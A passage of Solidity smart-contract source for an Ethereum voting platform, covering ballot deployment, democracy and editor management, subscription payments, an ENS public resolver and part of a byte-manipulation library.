democHash, bytes32 specHash, bytes32 extraData, uint packed, bool checkLimit, bool alreadySentTx) internal returns (uint ballotId) {\n require(BBLibV7.isTesting(BPackedUtils.packedToSubmissionBits(packed)) == false, \"b-testing\");\n uint8 bbFarmId = uint8(extraData[0]);\n require(deprecatedBBFarms[bbFarmId] == false, \"bb-dep\");\n BBFarmIface _bbFarm = bbFarms[bbFarmId];\n bool countTowardsLimit = checkLimit;\n bool performedSend;\n if (checkLimit) {\n uint64 endTime = BPackedUtils.packedToEndTime(packed);\n (countTowardsLimit, performedSend) = _basicBallotLimitOperations(democHash, _bbFarm);\n _accountOkayChecks(democHash, endTime);\n }\n if (!performedSend && msg.value > 0 && alreadySentTx == false) {\n doSafeSend(msg.sender, msg.value);\n }\n ballotId = _bbFarm.initBallot(\n specHash,\n packed,\n this,\n msg.sender,\n bytes24(uint192(extraData)));\n _addBallot(democHash, ballotId, packed, countTowardsLimit);\n }\n function dDeployCommunityBallot(bytes32 democHash, bytes32 specHash, bytes32 extraData, uint128 packedTimes) external payable {\n uint price = commAuction.getNextPrice(democHash);\n require(msg.value >= price, \"!cb-fee\");\n doSafeSend(payments.getPayTo(), price);\n doSafeSend(msg.sender, msg.value - price);\n bool canProceed = backend.getDCommBallotsEnabled(democHash) || !payments.accountInGoodStanding(democHash);\n require(canProceed, \"!cb-enabled\");\n uint256 packed = BPackedUtils.setSB(uint256(packedTimes), (USE_ETH | USE_NO_ENC));\n uint ballotId = _deployBallot(democHash, specHash, extraData, packed, false, true);\n commAuction.noteBallotDeployed(democHash);\n emit CommunityBallot(democHash, ballotId);\n }\n function dDeployBallot(bytes32 democHash, bytes32 specHash, bytes32 extraData, uint256 packed)\n onlyDemocEditor(democHash)\n external payable {\n _deployBallot(democHash, specHash, extraData, packed, true, false);\n }\n function _addBallot(bytes32 democHash, uint256 ballotId, uint256 packed, bool countTowardsLimit) internal {\n backend.dAddBallot(democHash, ballotId, packed, countTowardsLimit);\n }\n function _accountOkayChecks(bytes32 democHash, uint64 endTime) internal view {\n uint secsLeft = payments.getSecondsRemaining(democHash);\n uint256 secsToEndTime = endTime - now;\n require(secsLeft * 2 > secsToEndTime, \"unpaid\");\n }\n function _basicBallotLimitOperations(bytes32 democHash, BBFarmIface _bbFarm) internal returns (bool shouldCount, bool performedSend) {\n if (payments.getPremiumStatus(democHash) == false) {\n uint nBallotsAllowed = payments.getBasicBallotsPer30Days();\n uint nBallotsBasicCounted = backend.getDCountedBasicBallotsN(democHash);\n if (nBallotsAllowed > nBallotsBasicCounted) {\n return (true, false);\n }\n uint earlyBallotId = backend.getDCountedBasicBallotID(democHash, nBallotsBasicCounted - nBallotsAllowed);\n uint earlyBallotTs = _bbFarm.getCreationTs(earlyBallotId);\n if (earlyBallotTs < now - 30 days) {\n return (true, false);\n }\n uint extraBallotFee = payments.getBasicExtraBallotFeeWei();\n require(msg.value >= extraBallotFee, \"!extra-b-fee\");\n uint remainder = msg.value - extraBallotFee;\n doSafeSend(address(payments), extraBallotFee);\n doSafeSend(msg.sender, remainder);\n emit PaymentMade([extraBallotFee, remainder]);\n return (false, true);\n } else {\n return (false, false);\n }\n }\n}\ncontract IxBackendIface is hasVersion, ixBackendEvents, permissioned, payoutAllC {\n function getGDemocsN() external view returns (uint);\n function getGDemoc(uint id) external view returns (bytes32);\n function getGErc20ToDemocs(address erc20) external view returns (bytes32[] democHashes);\n function dAdd(bytes32 democHash, address erc20, bool disableErc20OwnerClaim) external;\n function emergencySetDOwner(bytes32 democHash, address newOwner) external;\n function dInit(address defaultErc20, address initOwner, bool disableErc20OwnerClaim) external returns (bytes32 democHash);\n function setDOwner(bytes32 democHash, address newOwner) external;\n function setDOwnerFromClaim(bytes32 democHash, address newOwner) external;\n function setDEditor(bytes32 democHash, address editor, bool canEdit) external;\n function setDNoEditors(bytes32 democHash) external;\n function setDErc20(bytes32 democHash, address newErc20) external;\n function dSetArbitraryData(bytes32 democHash, bytes key, bytes value) external;\n function dSetEditorArbitraryData(bytes32 democHash, bytes key, bytes value) external;\n function dAddCategory(bytes32 democHash, bytes32 categoryName, bool hasParent, uint parent) external;\n function dDeprecateCategory(bytes32 democHash, uint catId) external;\n function dSetCommunityBallotsEnabled(bytes32 democHash, bool enabled) external;\n function dDisableErc20OwnerClaim(bytes32 democHash) external;\n function dAddBallot(bytes32 democHash, uint ballotId, uint256 packed, bool countTowardsLimit) external;\n function getDOwner(bytes32 democHash) external view returns (address);\n function isDEditor(bytes32 democHash, address editor) external view returns (bool);\n function getDHash(bytes13 prefix) external view returns (bytes32);\n function getDInfo(bytes32 democHash) external view returns (address erc20, address owner, uint256 nBallots);\n function getDErc20(bytes32 democHash) external view returns (address);\n function getDArbitraryData(bytes32 democHash, bytes key) external view returns (bytes value);\n function getDEditorArbitraryData(bytes32 democHash, bytes key) external view returns (bytes value);\n function getDBallotsN(bytes32 democHash) external view returns (uint256);\n function getDBallotID(bytes32 democHash, uint n) external view returns (uint ballotId);\n function getDCountedBasicBallotsN(bytes32 democHash) external view returns (uint256);\n function getDCountedBasicBallotID(bytes32 democHash, uint256 n) external view returns (uint256);\n function getDCategoriesN(bytes32 democHash) external view returns (uint);\n function getDCategory(bytes32 democHash, uint catId) external view returns (bool deprecated, bytes32 name, bool hasParent, uint parent);\n function getDCommBallotsEnabled(bytes32 democHash) external view returns (bool);\n function getDErc20OwnerClaimEnabled(bytes32 democHash) external view returns (bool);\n}\ncontract SVIndexBackend is IxBackendIface {\n uint constant VERSION = 2;\n struct Democ {\n address erc20;\n address owner;\n bool communityBallotsDisabled;\n bool erc20OwnerClaimDisabled;\n uint editorEpoch;\n mapping (uint => mapping (address => bool)) editors;\n uint256[] allBallots;\n uint256[] includedBasicBallots;\n }\n struct BallotRef {\n bytes32 democHash;\n uint ballotId;\n }\n struct Category {\n bool deprecated;\n bytes32 name;\n bool hasParent;\n uint parent;\n }\n struct CategoriesIx {\n uint nCategories;\n mapping(uint => Category) categories;\n }\n mapping (bytes32 => Democ) democs;\n mapping (bytes32 => CategoriesIx) democCategories;\n mapping (bytes13 => bytes32) democPrefixToHash;\n mapping (address => bytes32[]) erc20ToDemocs;\n bytes32[] democList;\n mapping (bytes32 => mapping (bytes32 => bytes)) arbitraryData;\n constructor() payoutAllC(msg.sender) public {\n }\n function _getPayTo() internal view returns (address) {\n return owner;\n }\n function getVersion() external pure returns (uint) {\n return VERSION;\n }\n function getGDemocsN() external view returns (uint) {\n return democList.length;\n }\n function getGDemoc(uint id) external view returns (bytes32) {\n return democList[id];\n }\n function getGErc20ToDemocs(address erc20) external view returns (bytes32[] democHashes) {\n return erc20ToDemocs[erc20];\n }\n function _addDemoc(bytes32 democHash, address erc20, address initOwner, bool disableErc20OwnerClaim) internal {\n democList.push(democHash);\n Democ storage d = democs[democHash];\n d.erc20 = erc20;\n if (disableErc20OwnerClaim) {\n d.erc20OwnerClaimDisabled = true;\n }\n assert(democPrefixToHash[bytes13(democHash)] == bytes32(0));\n democPrefixToHash[bytes13(democHash)] = democHash;\n erc20ToDemocs[erc20].push(democHash);\n _setDOwner(democHash, initOwner);\n emit NewDemoc(democHash);\n }\n function dAdd(bytes32 democHash, address erc20, bool disableErc20OwnerClaim) only_owner() external {\n _addDemoc(democHash, erc20, msg.sender, disableErc20OwnerClaim);\n emit ManuallyAddedDemoc(democHash, erc20);\n }\n function emergencySetDOwner(bytes32 democHash, address newOwner) only_owner() external {\n _setDOwner(democHash, newOwner);\n emit EmergencyDemocOwner(democHash, newOwner);\n }\n function dInit(address defaultErc20, address initOwner, bool disableErc20OwnerClaim) only_editors() external returns (bytes32 democHash) {\n democHash = keccak256(abi.encodePacked(democList.length, blockhash(block.number-1), defaultErc20, now));\n _addDemoc(democHash, defaultErc20, initOwner, disableErc20OwnerClaim);\n }\n function _setDOwner(bytes32 democHash, address newOwner) internal {\n Democ storage d = democs[democHash];\n uint epoch = d.editorEpoch;\n d.owner = newOwner;\n d.editors[epoch][d.owner] = false;\n d.editors[epoch][newOwner] = true;\n emit DemocOwnerSet(democHash, newOwner);\n }\n function setDOwner(bytes32 democHash, address newOwner) only_editors() external {\n _setDOwner(democHash, newOwner);\n }\n function setDOwnerFromClaim(bytes32 democHash, address newOwner) only_editors() external {\n Democ storage d = democs[democHash];\n require(d.erc20OwnerClaimDisabled == false, \"!erc20-claim\");\n d.owner = newOwner;\n d.editors[d.editorEpoch][newOwner] = true;\n d.erc20OwnerClaimDisabled = true;\n emit DemocOwnerSet(democHash, newOwner);\n emit DemocClaimed(democHash);\n }\n function setDEditor(bytes32 democHash, address editor, bool canEdit) only_editors() external {\n Democ storage d = democs[democHash];\n d.editors[d.editorEpoch][editor] = canEdit;\n emit DemocEditorSet(democHash, editor, canEdit);\n }\n function setDNoEditors(bytes32 democHash) only_editors() external {\n democs[democHash].editorEpoch += 1;\n emit DemocEditorsWiped(democHash);\n }\n function setDErc20(bytes32 democHash, address newErc20) only_editors() external {\n democs[democHash].erc20 = newErc20;\n erc20ToDemocs[newErc20].push(democHash);\n emit DemocErc20Set(democHash, newErc20);\n }\n function dSetArbitraryData(bytes32 democHash, bytes key, bytes value) only_editors() external {\n bytes32 k = keccak256(key);\n arbitraryData[democHash][k] = value;\n emit DemocDataSet(democHash, k);\n }\n function dSetEditorArbitraryData(bytes32 democHash, bytes key, bytes value) only_editors() external {\n bytes32 k = keccak256(_calcEditorKey(key));\n arbitraryData[democHash][k] = value;\n emit DemocDataSet(democHash, k);\n }\n function dAddCategory(bytes32 democHash, bytes32 name, bool hasParent, uint parent) only_editors() external {\n uint catId = democCategories[democHash].nCategories;\n democCategories[democHash].categories[catId].name = name;\n if (hasParent) {\n democCategories[democHash].categories[catId].hasParent = true;\n democCategories[democHash].categories[catId].parent = parent;\n }\n democCategories[democHash].nCategories += 1;\n emit DemocCatAdded(democHash, catId);\n }\n function dDeprecateCategory(bytes32 democHash, uint catId) only_editors() external {\n democCategories[democHash].categories[catId].deprecated = true;\n emit DemocCatDeprecated(democHash, catId);\n }\n function dSetCommunityBallotsEnabled(bytes32 democHash, bool enabled) only_editors() external {\n democs[democHash].communityBallotsDisabled = !enabled;\n emit DemocCommunityBallotsEnabled(democHash, enabled);\n }\n function dDisableErc20OwnerClaim(bytes32 democHash) only_editors() external {\n democs[democHash].erc20OwnerClaimDisabled = true;\n emit DemocErc20OwnerClaimDisabled(democHash);\n }\n function _commitBallot(bytes32 democHash, uint ballotId, uint256 packed, bool countTowardsLimit) internal {\n uint16 subBits;\n subBits = BPackedUtils.packedToSubmissionBits(packed);\n uint localBallotId = democs[democHash].allBallots.length;\n democs[democHash].allBallots.push(ballotId);\n if (countTowardsLimit) {\n democs[democHash].includedBasicBallots.push(ballotId);\n }\n emit NewBallot(democHash, localBallotId);\n }\n function dAddBallot(bytes32 democHash, uint ballotId, uint256 packed, bool countTowardsLimit) only_editors() external {\n _commitBallot(democHash, ballotId, packed, countTowardsLimit);\n }\n function getDOwner(bytes32 democHash) external view returns (address) {\n return democs[democHash].owner;\n }\n function isDEditor(bytes32 democHash, address editor) external view returns (bool) {\n Democ storage d = democs[democHash];\n return d.editors[d.editorEpoch][editor] || editor == d.owner;\n }\n function getDHash(bytes13 prefix) external view returns (bytes32) {\n return democPrefixToHash[prefix];\n }\n function getDInfo(bytes32 democHash) external view returns (address erc20, address owner, uint256 nBallots) {\n return (democs[democHash].erc20, democs[democHash].owner, democs[democHash].allBallots.length);\n }\n function getDErc20(bytes32 democHash) external view returns (address) {\n return democs[democHash].erc20;\n }\n function getDArbitraryData(bytes32 democHash, bytes key) external view returns (bytes) {\n return arbitraryData[democHash][keccak256(key)];\n }\n function getDEditorArbitraryData(bytes32 democHash, bytes key) external view returns (bytes) {\n return arbitraryData[democHash][keccak256(_calcEditorKey(key))];\n }\n function getDBallotsN(bytes32 democHash) external view returns (uint256) {\n return democs[democHash].allBallots.length;\n }\n function getDBallotID(bytes32 democHash, uint256 n) external view returns (uint ballotId) {\n return democs[democHash].allBallots[n];\n }\n function getDCountedBasicBallotsN(bytes32 democHash) external view returns (uint256) {\n return democs[democHash].includedBasicBallots.length;\n }\n function getDCountedBasicBallotID(bytes32 democHash, uint256 n) external view returns (uint256) {\n return democs[democHash].includedBasicBallots[n];\n }\n function getDCategoriesN(bytes32 democHash) external view returns (uint) {\n return democCategories[democHash].nCategories;\n }\n function getDCategory(bytes32 democHash, uint catId) external view returns (bool deprecated, bytes32 name, bool hasParent, uint256 parent) {\n deprecated = democCategories[democHash].categories[catId].deprecated;\n name = democCategories[democHash].categories[catId].name;\n hasParent = democCategories[democHash].categories[catId].hasParent;\n parent = democCategories[democHash].categories[catId].parent;\n }\n function getDCommBallotsEnabled(bytes32 democHash) external view returns (bool) {\n return !democs[democHash].communityBallotsDisabled;\n }\n function getDErc20OwnerClaimEnabled(bytes32 democHash) external view returns (bool) {\n return !democs[democHash].erc20OwnerClaimDisabled;\n }\n function _calcEditorKey(bytes key) internal pure returns (bytes) {\n return abi.encodePacked(\"editor.\", key);\n }\n}\ncontract IxPaymentsIface is hasVersion, ixPaymentEvents, permissioned, CanReclaimToken, payoutAllCSettable {\n function emergencySetOwner(address newOwner) external;\n function weiBuysHowManySeconds(uint amount) public view returns (uint secs);\n function weiToCents(uint w) public view returns (uint);\n function centsToWei(uint c) public view returns (uint);\n function payForDemocracy(bytes32 democHash) external payable;\n function doFreeExtension(bytes32 democHash) external;\n function downgradeToBasic(bytes32 democHash) external;\n function upgradeToPremium(bytes32 democHash) external;\n function accountInGoodStanding(bytes32 democHash) external view returns (bool);\n function getSecondsRemaining(bytes32 democHash) external view returns (uint);\n function getPremiumStatus(bytes32 democHash) external view returns (bool);\n function getFreeExtension(bytes32 democHash) external view returns (bool);\n function getAccount(bytes32 democHash) external view returns (bool isPremium, uint lastPaymentTs, uint paidUpTill, bool hasFreeExtension);\n function getDenyPremium(bytes32 democHash) external view returns (bool);\n function giveTimeToDemoc(bytes32 democHash, uint additionalSeconds, bytes32 ref) external;\n function setPayTo(address) external;\n function setMinorEditsAddr(address) external;\n function setBasicCentsPricePer30Days(uint amount) external;\n function setBasicBallotsPer30Days(uint amount) external;\n function setPremiumMultiplier(uint8 amount) external;\n function setWeiPerCent(uint) external;\n function setFreeExtension(bytes32 democHash, bool hasFreeExt) external;\n function setDenyPremium(bytes32 democHash, bool isPremiumDenied) external;\n function setMinWeiForDInit(uint amount) external;\n function getBasicCentsPricePer30Days() external view returns(uint);\n function getBasicExtraBallotFeeWei() external view returns (uint);\n function getBasicBallotsPer30Days() external view returns (uint);\n function getPremiumMultiplier() external view returns (uint8);\n function getPremiumCentsPricePer30Days() external view returns (uint);\n function getWeiPerCent() external view returns (uint weiPerCent);\n function getUsdEthExchangeRate() external view returns (uint centsPerEth);\n function getMinWeiForDInit() external view returns (uint);\n function getPaymentLogN() external view returns (uint);\n function getPaymentLog(uint n) external view returns (bool _external, bytes32 _democHash, uint _seconds, uint _ethValue);\n}\ncontract SVPayments is IxPaymentsIface {\n uint constant VERSION = 2;\n struct Account {\n bool isPremium;\n uint lastPaymentTs;\n uint paidUpTill;\n uint lastUpgradeTs;\n }\n struct PaymentLog {\n bool _external;\n bytes32 _democHash;\n uint _seconds;\n uint _ethValue;\n }\n address public minorEditsAddr;\n uint basicCentsPricePer30Days = 125000;\n uint basicBallotsPer30Days = 10;\n uint8 premiumMultiplier = 5;\n uint weiPerCent = 0.000016583747 ether;\n uint minWeiForDInit = 1;\n mapping (bytes32 => Account) accounts;\n PaymentLog[] payments;\n mapping (bytes32 => bool) denyPremium;\n mapping (bytes32 => bool) freeExtension;\n address public emergencyAdmin;\n function emergencySetOwner(address newOwner) external {\n require(msg.sender == emergencyAdmin, \"!emergency-owner\");\n owner = newOwner;\n }\n constructor(address _emergencyAdmin) payoutAllCSettable(msg.sender) public {\n emergencyAdmin = _emergencyAdmin;\n assert(_emergencyAdmin != address(0));\n }\n function getVersion() external pure returns (uint) {\n return VERSION;\n }\n function() payable public {\n _getPayTo().transfer(msg.value);\n }\n function _modAccountBalance(bytes32 democHash, uint additionalSeconds) internal {\n uint prevPaidTill = accounts[democHash].paidUpTill;\n if (prevPaidTill < now) {\n prevPaidTill = now;\n }\n accounts[democHash].paidUpTill = prevPaidTill + additionalSeconds;\n accounts[democHash].lastPaymentTs = now;\n }\n function weiBuysHowManySeconds(uint amount) public view returns (uint) {\n uint centsPaid = weiToCents(amount);\n uint monthsOffsetPaid = ((10 ** 18) * centsPaid) / basicCentsPricePer30Days;\n uint secondsOffsetPaid = monthsOffsetPaid * (30 days);\n uint additionalSeconds = secondsOffsetPaid / (10 ** 18);\n return additionalSeconds;\n }\n function weiToCents(uint w) public view returns (uint) {\n return w / weiPerCent;\n }\n function centsToWei(uint c) public view returns (uint) {\n return c * weiPerCent;\n }\n function payForDemocracy(bytes32 democHash) external payable {\n require(msg.value > 0, \"need to send some ether to make payment\");\n uint additionalSeconds = weiBuysHowManySeconds(msg.value);\n if (accounts[democHash].isPremium) {\n additionalSeconds /= premiumMultiplier;\n }\n if (additionalSeconds >= 1) {\n _modAccountBalance(democHash, additionalSeconds);\n }\n payments.push(PaymentLog(false, democHash, additionalSeconds, msg.value));\n emit AccountPayment(democHash, additionalSeconds);\n _getPayTo().transfer(msg.value);\n }\n function doFreeExtension(bytes32 democHash) external {\n require(freeExtension[democHash], \"!free\");\n uint newPaidUpTill = now + 60 days;\n accounts[democHash].paidUpTill = newPaidUpTill;\n emit FreeExtension(democHash);\n }\n function downgradeToBasic(bytes32 democHash) only_editors() external {\n require(accounts[democHash].isPremium, \"!premium\");\n accounts[democHash].isPremium = false;\n uint paidTill = accounts[democHash].paidUpTill;\n uint timeRemaining = SafeMath.subToZero(paidTill, now);\n if (timeRemaining > 0) {\n require(accounts[democHash].lastUpgradeTs < (now - 24 hours), \"downgrade-too-soon\");\n timeRemaining *= premiumMultiplier;\n accounts[democHash].paidUpTill = now + timeRemaining;\n }\n emit DowngradeToBasic(democHash);\n }\n function upgradeToPremium(bytes32 democHash) only_editors() external {\n require(denyPremium[democHash] == false, \"upgrade-denied\");\n require(!accounts[democHash].isPremium, \"!basic\");\n accounts[democHash].isPremium = true;\n uint paidTill = accounts[democHash].paidUpTill;\n uint timeRemaining = SafeMath.subToZero(paidTill, now);\n if (timeRemaining > 0) {\n timeRemaining /= premiumMultiplier;\n accounts[democHash].paidUpTill = now + timeRemaining;\n }\n accounts[democHash].lastUpgradeTs = now;\n emit UpgradedToPremium(democHash);\n }\n function accountInGoodStanding(bytes32 democHash) external view returns (bool) {\n return accounts[democHash].paidUpTill >= now;\n }\n function getSecondsRemaining(bytes32 democHash) external view returns (uint) {\n return SafeMath.subToZero(accounts[democHash].paidUpTill, now);\n }\n function getPremiumStatus(bytes32 democHash) external view returns (bool) {\n return accounts[democHash].isPremium;\n }\n function getFreeExtension(bytes32 democHash) external view returns (bool) {\n return freeExtension[democHash];\n }\n function getAccount(bytes32 democHash) external view returns (bool isPremium, uint lastPaymentTs, uint paidUpTill, bool hasFreeExtension) {\n isPremium = accounts[democHash].isPremium;\n lastPaymentTs = accounts[democHash].lastPaymentTs;\n paidUpTill = accounts[democHash].paidUpTill;\n hasFreeExtension = freeExtension[democHash];\n }\n function getDenyPremium(bytes32 democHash) external view returns (bool) {\n return denyPremium[democHash];\n }\n function giveTimeToDemoc(bytes32 democHash, uint additionalSeconds, bytes32 ref) owner_or(minorEditsAddr) external {\n _modAccountBalance(democHash, additionalSeconds);\n payments.push(PaymentLog(true, democHash, additionalSeconds, 0));\n emit GrantedAccountTime(democHash, additionalSeconds, ref);\n }\n function setPayTo(address newPayTo) only_owner() external {\n _setPayTo(newPayTo);\n emit SetPayTo(newPayTo);\n }\n function setMinorEditsAddr(address a) only_owner() external {\n minorEditsAddr = a;\n emit SetMinorEditsAddr(a);\n }\n function setBasicCentsPricePer30Days(uint amount) only_owner() external {\n basicCentsPricePer30Days = amount;\n emit SetBasicCentsPricePer30Days(amount);\n }\n function setBasicBallotsPer30Days(uint amount) only_owner() external {\n basicBallotsPer30Days = amount;\n emit SetBallotsPer30Days(amount);\n }\n function setPremiumMultiplier(uint8 m) only_owner() external {\n premiumMultiplier = m;\n emit SetPremiumMultiplier(m);\n }\n function setWeiPerCent(uint wpc) owner_or(minorEditsAddr) external {\n weiPerCent = wpc;\n emit SetExchangeRate(wpc);\n }\n function setFreeExtension(bytes32 democHash, bool hasFreeExt) owner_or(minorEditsAddr) external {\n freeExtension[democHash] = hasFreeExt;\n emit SetFreeExtension(democHash, hasFreeExt);\n }\n function setDenyPremium(bytes32 democHash, bool isPremiumDenied) owner_or(minorEditsAddr) external {\n denyPremium[democHash] = isPremiumDenied;\n emit SetDenyPremium(democHash, isPremiumDenied);\n }\n function setMinWeiForDInit(uint amount) owner_or(minorEditsAddr) external {\n minWeiForDInit = amount;\n emit SetMinWeiForDInit(amount);\n }\n function getBasicCentsPricePer30Days() external view returns (uint) {\n return basicCentsPricePer30Days;\n }\n function getBasicExtraBallotFeeWei() external view returns (uint) {\n return centsToWei(basicCentsPricePer30Days / basicBallotsPer30Days);\n }\n function getBasicBallotsPer30Days() external view returns (uint) {\n return basicBallotsPer30Days;\n }\n function getPremiumMultiplier() external view returns (uint8) {\n return premiumMultiplier;\n }\n function getPremiumCentsPricePer30Days() external view returns (uint) {\n return _premiumPricePer30Days();\n }\n function _premiumPricePer30Days() internal view returns (uint) {\n return uint(premiumMultiplier) * basicCentsPricePer30Days;\n }\n function getWeiPerCent() external view returns (uint) {\n return weiPerCent;\n }\n function getUsdEthExchangeRate() external view returns (uint) {\n return 1 ether / weiPerCent;\n }\n function getMinWeiForDInit() external view returns (uint) {\n return minWeiForDInit;\n }\n function getPaymentLogN() external view returns (uint) {\n return payments.length;\n }\n function getPaymentLog(uint n) external view returns (bool _external, bytes32 _democHash, uint _seconds, uint _ethValue) {\n _external = payments[n]._external;\n _democHash = payments[n]._democHash;\n _seconds = payments[n]._seconds;\n _ethValue = payments[n]._ethValue;\n }\n}\ninterface SvEnsIface {\n event NewOwner(bytes32 indexed node, bytes32 indexed label, address owner);\n event Transfer(bytes32 indexed node, address owner);\n event NewResolver(bytes32 indexed node, address resolver);\n event NewTTL(bytes32 indexed node, uint64 ttl);\n function setSubnodeOwner(bytes32 node, bytes32 label, address owner) external returns (bytes32);\n function setResolver(bytes32 node, address resolver) external;\n function setOwner(bytes32 node, address owner) external;\n function setTTL(bytes32 node, uint64 ttl) external;\n function owner(bytes32 node) external view returns (address);\n function resolver(bytes32 node) external view returns (address);\n function ttl(bytes32 node) external view returns (uint64);\n}\ninterface ENSIface {\n event NewOwner(bytes32 indexed node, bytes32 indexed label, address owner);\n event Transfer(bytes32 indexed node, address owner);\n event NewResolver(bytes32 indexed node, address resolver);\n event NewTTL(bytes32 indexed node, uint64 ttl);\n function setSubnodeOwner(bytes32 node, bytes32 label, address owner) external;\n function setResolver(bytes32 node, address resolver) external;\n function setOwner(bytes32 node, address owner) external;\n function setTTL(bytes32 node, uint64 ttl) external;\n function owner(bytes32 node) external view returns (address);\n function resolver(bytes32 node) external view returns (address);\n function ttl(bytes32 node) external view returns (uint64);\n}\ncontract PublicResolver {\n bytes4 constant INTERFACE_META_ID = 0x01ffc9a7;\n bytes4 constant ADDR_INTERFACE_ID = 0x3b3b57de;\n bytes4 constant CONTENT_INTERFACE_ID = 0xd8389dc5;\n bytes4 constant NAME_INTERFACE_ID = 0x691f3431;\n bytes4 constant ABI_INTERFACE_ID = 0x2203ab56;\n bytes4 constant PUBKEY_INTERFACE_ID = 0xc8690233;\n bytes4 constant TEXT_INTERFACE_ID = 0x59d1d43c;\n event AddrChanged(bytes32 indexed node, address a);\n event ContentChanged(bytes32 indexed node, bytes32 hash);\n event NameChanged(bytes32 indexed node, string name);\n event ABIChanged(bytes32 indexed node, uint256 indexed contentType);\n event PubkeyChanged(bytes32 indexed node, bytes32 x, bytes32 y);\n event TextChanged(bytes32 indexed node, string indexedKey, string key);\n struct PublicKey {\n bytes32 x;\n bytes32 y;\n }\n struct Record {\n address addr;\n bytes32 content;\n string name;\n PublicKey pubkey;\n mapping(string=>string) text;\n mapping(uint256=>bytes) abis;\n }\n ENSIface ens;\n mapping (bytes32 => Record) records;\n modifier only_owner(bytes32 node) {\n require(ens.owner(node) == msg.sender);\n _;\n }\n constructor(ENSIface ensAddr) public {\n ens = ensAddr;\n }\n function setAddr(bytes32 node, address addr) public only_owner(node) {\n records[node].addr = addr;\n emit AddrChanged(node, addr);\n }\n function setContent(bytes32 node, bytes32 hash) public only_owner(node) {\n records[node].content = hash;\n emit ContentChanged(node, hash);\n }\n function setName(bytes32 node, string name) public only_owner(node) {\n records[node].name = name;\n emit NameChanged(node, name);\n }\n function setABI(bytes32 node, uint256 contentType, bytes data) public only_owner(node) {\n require(((contentType - 1) & contentType) == 0);\n records[node].abis[contentType] = data;\n emit ABIChanged(node, contentType);\n }\n function setPubkey(bytes32 node, bytes32 x, bytes32 y) public only_owner(node) {\n records[node].pubkey = PublicKey(x, y);\n emit PubkeyChanged(node, x, y);\n }\n function setText(bytes32 node, string key, string value) public only_owner(node) {\n records[node].text[key] = value;\n emit TextChanged(node, key, key);\n }\n function text(bytes32 node, string key) public view returns (string) {\n return records[node].text[key];\n }\n function pubkey(bytes32 node) public view returns (bytes32 x, bytes32 y) {\n return (records[node].pubkey.x, records[node].pubkey.y);\n }\n function ABI(bytes32 node, uint256 contentTypes) public view returns (uint256 contentType, bytes data) {\n Record storage record = records[node];\n for (contentType = 1; contentType <= contentTypes; contentType <<= 1) {\n if ((contentType & contentTypes) != 0 && record.abis[contentType].length > 0) {\n data = record.abis[contentType];\n return;\n }\n }\n contentType = 0;\n }\n function name(bytes32 node) public view returns (string) {\n return records[node].name;\n }\n function content(bytes32 node) public view returns (bytes32) {\n return records[node].content;\n }\n function addr(bytes32 node) public view returns (address) {\n return records[node].addr;\n }\n function supportsInterface(bytes4 interfaceID) public pure returns (bool) {\n return interfaceID == ADDR_INTERFACE_ID ||\n interfaceID == CONTENT_INTERFACE_ID ||\n interfaceID == NAME_INTERFACE_ID ||\n interfaceID == ABI_INTERFACE_ID ||\n interfaceID == PUBKEY_INTERFACE_ID ||\n interfaceID == TEXT_INTERFACE_ID ||\n interfaceID == INTERFACE_META_ID;\n }\n}\nlibrary BytesLib {\n function concat(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bytes) {\n bytes memory tempBytes;\n assembly {\n tempBytes := mload(0x40)\n let length := mload(_preBytes)\n mstore(tempBytes, length)\n let mc := add(tempBytes, 0x20)\n let end := add(mc, length)\n for {\n let cc := add(_preBytes, 0x20)\n } lt(mc, end) {\n mc := add(mc, 0x20)\n cc := add(cc, 0x20)\n } {\n mstore(mc, mload(cc))\n }\n length := mload(_postBytes)\n mstore(tempBytes, add(length, mload(tempBytes)))\n mc := end\n end := add(mc, length)\n for {\n let cc := add(_postBytes, 0x20)\n } lt(mc, end) {\n mc := add(mc, 0x20)\n cc := add(cc, 0x20)\n } {\n mstore(mc, mload(cc))\n }\n mstore(0x40, and(\n add(add(end, iszero(add(length, mload(_preBytes)))), 31),\n not(31)\n ))\n }\n return tempBytes;\n }\n function concatStorage(bytes storage _preBytes, bytes memory _postBytes) internal {\n assembly {\n let fslot := sload(_preBytes_slot)\n let slength := div(and(fslot, sub(mul(0x100, iszero(and(fslot, 1))), 1)), 2)\n let mlength := mload(_postBytes)\n let newlength := add(slength, mlength)\n switch add(lt(slength, 32), lt(newlength, 32))\n case 2 {\n sstore(\n _preBytes_slot,\n add(\n fslot,\n add(\n mul(\n div(\n mload(add(_postBytes, 0x20)),\n exp(0x100, sub(32, mlength))\n ),\n exp(0x100, sub(32, newlength))\n ),\n mul(mlength, 2)\n )\n )\n )\n }\n case 1 {\n mstore(0x0, _preBytes_slot)\n let sc := add(keccak256(0x0, 0x20), div(slength, 32))\n sstore(_preBytes_slot, add(mul(newlength, 2), 1))\n let submod := sub(32, slength)\n let mc := add(_postBytes, submod)\n let end := add(_postBytes, mlength)\n let mask := sub(exp(0x100, submod), 1)\n sstore(\n sc,\n add(\n and(\n fslot,\n 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00\n ),\n and(mload(mc), mask)\n )\n )\n for {\n mc := add(mc, 0x20)\n sc := add(sc, 1)\n } lt(mc, end) {\n sc := add(sc, 1)\n mc := add(mc, 0x20)\n } {\n sstore(sc, mload(mc))\n }\n mask := exp(0x100, sub(mc, end))\n sstore(sc, mul(div(mload(mc), mask), mask))\n }\n default {\n mstore(0x0, _preBytes_slot)\n let sc := add(keccak256(0x0, 0x20), div(slength, 32))\n sstore(_preBytes_slot, add(mul(newlength, 2), 1))\n let slengthmod := mod(slength, 32)\n let mlengthmod := mod(mlength, 32)\n let submod := sub(32, slengthmod)\n let mc := add(_postBytes, submod)\n let end := add(_postBytes, mlength)\n let mask := sub(exp(0x100, submod), 1)\n sstore(sc, add(sload(sc), and(mload(mc), mask)))\n for {\n sc := add(sc, 1)\n mc := add(mc, 0x20)\n } lt(mc, end) {\n sc := add(sc, 1)\n mc := add(mc, 0x20)\n } {\n sstore(sc, mload(mc))\n }\n mask := exp(0x100, sub(mc, end))\n sstore(sc, mul(div(mload(mc), mask), mask))\n }\n }\n }\n function slice(bytes _bytes, uint _start, uint _length) internal pure returns (bytes) {\n require(_bytes.length >= (_start + _length));\n bytes memory tempBytes;\n assembly {\n switch iszero(_length)\n case 0 {\n tempBytes := mload(0x40)\n let lengthmod := and(_length, 31)\n let mc := add(add(tempBytes, lengthmod), mul(0x20, iszero(lengthmod)))\n let end := add(mc, _length)\n for {\n let cc := add(add(add(_bytes, lengthmod), mul(0x20, iszero(lengthmod))), _start)\n } lt(mc, 